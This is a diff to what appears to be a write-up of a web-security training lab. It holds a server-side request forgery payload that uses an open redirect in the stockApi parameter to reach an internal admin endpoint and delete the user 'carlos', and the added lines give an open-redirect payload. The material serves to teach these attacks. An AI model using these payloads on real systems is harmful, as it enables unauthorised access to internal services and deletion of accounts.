@@ -26,4 +26,8 @@ Analysis:
 6. Now we can delete the user carlos by this request:
 *** stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
 
+
+NOTE: When we go to the nextProduct it shows the request like this: /product/nextProduct?currentProductId=2&path=/product?productId=3 and if we try openredirect there we can find it, we will found it by: 
+OPENREDIRECT PAYLOAD : /product/nextProduct?currentProductId=2&path=http://www.google.com 
+
 HENCE WE SOLVED THE LAB
